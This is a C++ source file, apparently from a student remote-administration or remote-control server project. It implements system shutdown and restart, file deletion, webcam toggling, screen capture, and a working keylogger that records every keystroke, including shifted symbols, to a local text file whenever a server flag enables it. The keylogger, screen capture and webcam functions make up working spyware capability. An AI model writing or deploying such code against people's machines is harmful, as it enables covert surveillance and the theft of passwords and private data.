﻿#include "WindowAPI.h"


int ShutdownSystem() {
	int result = system("shutdown /s /t 30");
	return result;
}
int ResetSystem() {
	return system("shutdown /r /t 0");
}
string TranslateKey(int key, bool capsLock, bool shiftPressed, bool winPressed) {
	if (key == VK_SPACE) return "[SPACE]";
	if (key == VK_RETURN) return "[ENTER]";
	if (key == VK_BACK) return "[BACKSPACE]";
	if (key == VK_SHIFT) return "[SHIFT]";
	if (key == VK_CONTROL) return "[CTRL]";
	if (key == VK_TAB) return "[TAB]";
	if (key == VK_ESCAPE) return "[ESC]";
	if (key == VK_LWIN || key == VK_RWIN) return winPressed ? "[WIN]" : "";

	if (key >= '0' && key <= '9') {
		if (shiftPressed) {
			string shiftSymbols = ")!@#$%^&*(";  
			return string(1, shiftSymbols[key - '0']);
		}
		return string(1, (char)key); 
	}

	if (key >= 'A' && key <= 'Z') {
		if (capsLock ^ shiftPressed) {
			return string(1, (char)key);  
		}
		return string(1, (char)(key + 32));  
	}

	switch (key) {
	case VK_OEM_1: return shiftPressed ? ":" : ";";
	case VK_OEM_2: return shiftPressed ? "?" : "/";
	case VK_OEM_3: return shiftPressed ? "~" : "`";
	case VK_OEM_4: return shiftPressed ? "{" : "[";
	case VK_OEM_5: return shiftPressed ? "|" : "\\";
	case VK_OEM_6: return shiftPressed ? "}" : "]";
	case VK_OEM_7: return shiftPressed ? "\"" : "'";
	case VK_OEM_PLUS: return shiftPressed ? "+" : "=";
	case VK_OEM_COMMA: return shiftPressed ? "<" : ",";
	case VK_OEM_MINUS: return shiftPressed ? "_" : "-";
	case VK_OEM_PERIOD: return shiftPressed ? ">" : ".";
	}

	return "";  // Khong xu li cac phim khac
}
void Keylogger(bool& isKeyLoggerOn, bool &isServerOn) { 
	//Turn off the app?
	fstream output;
	output.open("_Data/KeyLogger/keyLogger.txt", ios::out);
	bool capsLock = false;  
	bool winPressed = false; 
	vector<int> previousStates(256, 0);  

	while (isServerOn) {
		if (!isKeyLoggerOn) continue;
		Sleep(10);  // Giảm tải CPU

		capsLock = (GetKeyState(VK_CAPITAL) & 0x0001);

		winPressed = (GetAsyncKeyState(VK_LWIN) & 0x8000) || (GetAsyncKeyState(VK_RWIN) & 0x8000);

		for (int i = 8; i <= 0xFE; i++) {  
			SHORT keyState = GetAsyncKeyState(i);  

			if ((keyState & 0x8000) && !(previousStates[i] & 0x8000)) { 
				bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000);
				string keyData = TranslateKey(i, capsLock, shiftPressed, winPressed);
				if (!keyData.empty()) {
					output << keyData << endl;  
				}
			}

			previousStates[i] = keyState;
		}
	}
	output.close();
}
bool DeleteFile(const string& filepath) {
	if (DeleteFileA(filepath.c_str())) {
		return true;
	}
	else {
		DWORD errorCode = GetLastError(); 
		if (errorCode == ERROR_ACCESS_DENIED) {
			cerr << "Access Denied. Check permissions or run as administrator.\n";
		}
		else {
			cerr << "Error deleting file: " << errorCode << endl;
		}
		return false;
	}
}
void Webcam(bool& isWebcamOn, bool& isServerOn) {
	WebcamController webcam;
	MSG msg;
	bool isWebcamRunning = false;
	while (isServerOn) {
		while (PeekMessage(&msg, nullptr, 0, 0, PM_REMOVE)) {
			TranslateMessage(&msg);
			DispatchMessage(&msg);

			if (msg.message == WM_QUIT) {
				return;
			}
		}
		if (isWebcamOn && !isWebcamRunning) {
			webcam.startWebcam();
			isWebcamRunning = true;
		}
		else if (!isWebcamOn && isWebcamRunning) {
			webcam.stopWebcam();
			isWebcamRunning = false;
		}
	}
}
bool CaptureScreen(){
	const string outputFile = "_Data/Screenshot/screenshot.jpg";
	int screenWidth = 1920;
	int screenHeight = 1080;

	HDC hDesktopDC = GetDC(NULL);

	HDC hCaptureDC = CreateCompatibleDC(hDesktopDC);

	HBITMAP hCaptureBitmap = CreateCompatibleBitmap(hDesktopDC, screenWidth, screenHeight);

	SelectObject(hCaptureDC, hCaptureBitmap);

	BitBlt(hCaptureDC, 0, 0, screenWidth, screenHeight, hDesktopDC, 0, 0, SRCCOPY);

	CImage image;
	image.Attach(hCaptureBitmap);
	HRESULT hr = image.Save(outputFile.c_str(), Gdiplus::ImageFormatJPEG);


	image.Detach();
	DeleteObject(hCaptureBitmap);
	DeleteDC(hCaptureDC);
	ReleaseDC(NULL, hDesktopDC);

	if (SUCCEEDED(hr)) return true;
	return false;
}

